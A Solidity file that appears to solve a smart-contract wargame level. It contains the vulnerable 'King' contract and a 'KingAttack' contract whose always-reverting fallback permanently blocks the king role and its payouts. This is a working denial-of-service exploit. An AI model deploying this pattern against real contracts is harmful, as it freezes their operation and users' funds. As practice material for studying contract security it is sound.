// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract KingAttack{
    constructor(address _targetContract) public payable{
        (bool success, ) = payable(address(_targetContract)).call{value: msg.value}("");
        require(success, "External call failed");
    }
    fallback() external{
        revert("Can't claim ownership now!");
    } 
}